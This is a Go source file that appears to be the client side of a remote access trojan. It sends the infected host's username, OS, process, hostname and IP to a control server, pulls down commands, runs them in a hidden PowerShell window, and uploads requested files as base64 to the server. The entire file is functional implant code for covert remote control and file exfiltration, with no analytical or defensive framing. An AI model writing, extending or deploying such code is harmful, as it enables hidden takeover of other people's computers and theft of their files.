package Interact

import (
	"bufio"
	"bytes"
	"encoding/base64"
	"encoding/json"
	"fmt"
	"io/ioutil"
	"net/http"
	"os"
	"os/exec"
	"syscall"
)

type commandType struct {
	Command_param string `json:"command_par"`
	Command       string `json:"command"`
	Target_UID    string `json:"target_uid"`
	Id            int    `json:"id"`
}

type user struct {
	Username string
	Password string
}

func Interact(url string, username string, ram string, os string, pid string, processname string, hostname string, syslan string, ip string, server string) string {
	//request method
	// method := "POST"

	strUser := "username"
	strRAM := "ram"
	strOS := "OS"
	strPID := "pid"
	strProcname := "procname"
	strHostname := "hostname"
	strSyslan := "systemlan"
	strIP := "IP"

	qwe := make(map[string]string)

	qwe[strUser] = username
	qwe[strRAM] = ram
	qwe[strOS] = os
	qwe[strPID] = pid
	qwe[strProcname] = processname
	qwe[strHostname] = hostname
	qwe[strSyslan] = syslan
	qwe[strIP] = ip

	jsonData, _ := json.Marshal(qwe)

	client := &http.Client{}
	req, err := http.NewRequest("POST", url, bytes.NewBuffer(jsonData))
	// set HTTP request header Content-Type
	req.Header.Set("Content-Type", "application/json; charset=UTF-8")

	fmt.Print("Headers done!\n")
	if err != nil {
		fmt.Println(err)
	}

	fmt.Print("No errors!\n")

	res, err := client.Do(req)
	fmt.Print("Request done\n")

	if err != nil {
		fmt.Println(err)
	}
	fmt.Print("No Errors!\n")
	defer res.Body.Close()

	fmt.Print("Body reading!\n")
	body, err := ioutil.ReadAll(res.Body)

	if err != nil {
		fmt.Println(err)
	}

	var users []commandType

	var s string
	
	if err := json.Unmarshal([]byte(string(body)), &s); err != nil {
		panic(err)
	}

	fmt.Println(s)

	var command []commandType
	if err := json.Unmarshal([]byte(s), &command); err != nil {
		panic(err)
	}

	fmt.Println(command)

	fmt.Println("BOdy- > ", string(body))

	fmt.Println("users ->", users)

	for _, command := range command {
		fmt.Println("->", command.Target_UID)
		SendCommand(ExecuteCommand(command.Command, command.Command_param, command.Target_UID, command.Id, server), command.Id, server, command.Target_UID)

	}

	return string(body)

}

func Cd(oldDir string, newDir string) string {
	return "Changed from " + oldDir + " To: " + newDir
}

func ReturnB64File(filepath string) string {
	f, _ := os.Open("./" + filepath)

	reader := bufio.NewReader(f)
	content, _ := ioutil.ReadAll(reader)

	encoded := base64.StdEncoding.EncodeToString(content)

	return "hihib64FileEncodedUselessPieceOfStringHihi" + encoded

}
func ExecuteCommand(command string, command_param string, uid string, id int, url string) string {

	// if command_param == "cd" {
	// 	command_exe, err = os.Chdir(command)
	// }

	var command_resp = "Empty"

	if command_param == "cd" {
		NewWD, _ := syscall.Getwd()

		fmt.Println("CurrentWD:", NewWD)

		command_exec := syscall.Chdir(command[3:])

		if command_exec != nil {
			command_resp = "Error: filepath does not exist or there is an other problem"
		} else {
			fmt.Println("CurrentWD:", NewWD)
			UpdatedtWD, _ := syscall.Getwd()

			command_resp = Cd(NewWD, UpdatedtWD)
		}
	} else if command_param == "cmd" {
		cmd_path := "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe"
		cmd_instance := exec.Command(cmd_path, command)
		cmd_instance.SysProcAttr = &syscall.SysProcAttr{HideWindow: true}
		command_exec, err := cmd_instance.Output()

		if err != nil {
			fmt.Println(err)
		}

		command_resp = string(command_exec)
	} else if command_param == "download" {
		command_ar := ReturnB64File(command)

		if command_ar == "" {
			command_resp = "Failed to open file"
		} else {
			command_resp = string(command_ar)
		}

	} else {
		fmt.Println("No command matched")
	}

	// command_exec, err := exec.Command("powershell", command).Output()
	// if err != nil {
	// 	fmt.Println(err)
	//}
	fmt.Println("Result ->", command_resp)
	fmt.Println("Command shell ->", command_param)
	fmt.Println("Command ->", command)
	fmt.Println("ID ->", id)
	fmt.Println("UID ->", uid)
	fmt.Println("==========================================================")

	return command_resp

}

func SendCommand(command string, id int, url string, uid string) {
	var UrlServer = fmt.Sprintf("%v/command/%v/%v/report", url, id, uid)

	commandResult := "command"
	commandStruct := make(map[string]string)
	commandStruct[commandResult] = command

	jsonData, _ := json.Marshal(commandStruct)
	client := &http.Client{}
	req, err := http.NewRequest("POST", UrlServer, bytes.NewBuffer(jsonData))
	// set HTTP request header Content-Type
	req.Header.Set("Content-Type", "application/json; charset=UTF-8")

	fmt.Print("Headers done!\n")
	if err != nil {
		fmt.Println(err)
	}

	fmt.Print("No errors!\n")

	res, err := client.Do(req)
	fmt.Print("Request done\n")

	if err != nil {
		fmt.Println(err)
	}
	fmt.Print("No Errors!\n")
	defer res.Body.Close()

	fmt.Print("Body reading!\n")
	body, err := ioutil.ReadAll(res.Body)

	fmt.Printf(string(body))
}
